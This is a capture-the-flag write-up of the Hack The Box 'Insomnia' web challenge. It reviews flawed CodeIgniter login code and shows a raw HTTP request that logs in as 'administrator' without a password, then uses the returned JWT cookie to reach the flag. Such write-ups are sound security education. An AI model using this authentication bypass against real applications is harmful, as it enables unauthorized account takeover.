# 🧠 Hack The Box: Insomnia — Web Challenge (Easy)

**Category:** Web  
**Objective:** Gain administrator access and retrieve the flag  
**Author:** Audit-trace

---

## 🧩 Challenge Summary

The challenge presents a CodeIgniter-based PHP web application with login, registration, and a protected profile page. The goal is to gain unauthorized access as the `administrator` user.

---

## 🔍 Recon

Exploring the app, we find:
- `/index.php/login` (Login page)
- `/index.php/register` (Registration)
- `/index.php/profile` (Protected profile view)
- Uses JWT for session management via cookies

---

## 🛠️ Source Code Review (Given)

```php
if (!count($json_data) == 2) {
    return $this->respond("Please provide username and password", 404);
}
```

##🐞 Bug #1: Broken Input Validation

- The line above always evaluates as false == 2, meaning no validation actually happens. Even one key (like username only) will bypass the check.


##🐞 Bug #2: SQL Logic Flaw

```php
$query = $db->table("users")->getWhere($json_data, 1, 0);
```
- This accepts any user input as the query, which allows us to login by providing only a username (no password needed).

##💥 Exploitation:

🧪 Step 1: Bypass Login with Partial JSON
Send this request in Burp

```
POST /index.php/login HTTP/1.1
Host: <IP>:<Port>
Content-Type: application/json
Content-Length: 37

{
  "username": "administrator"
}
```

##✅ Returns:

```
{
  "message": "Login Succesful",
  "token": "<JWT_TOKEN>"
}
```

🧪 Step 2: Use Token to Access Protected Page and Login as Admin:

The token retrieved was used in the session management cookie and after the page was reloaded, we were able to retrieve the flag.


## 🔑 KEY_CONCEPTS:

- 🧰 **Burp Suite (Repeater / Proxy):**  
  Used to intercept, modify, and replay requests. Crucial for crafting custom login payloads and injecting raw JSON to bypass backend logic.

- 📡 **Manual HTTP Requests:**  
  Testing server behavior by removing or modifying parameters (e.g., sending only `"username"` without `"password"`).

- 🛠️ **Source Code Logic Review (Given in lab):**  
  Identified broken condition logic and insecure query structure.

- 🔒 **Session Hijacking via JWT Cookie Injection:**  
  Took the valid admin token and injected it in the `Cookie: token=` header to impersonate the administrator.

- 🔍 **No Password = Still Authenticated?**  
  Exploited faulty logic in `getWhere()` that doesn’t enforce password check if input isn’t validated.

- 🧪 **Minimal JSON Payload Crafting:**  
  Learned how to craft the exact POST body needed to exploit the logic flaw — stripping unnecessary fields.

- ⚠️ **Request Method Awareness:**  
  Realized POST vs GET mattered during testing (e.g., `/login` vs `/profile`), and used the correct one per endpoint.



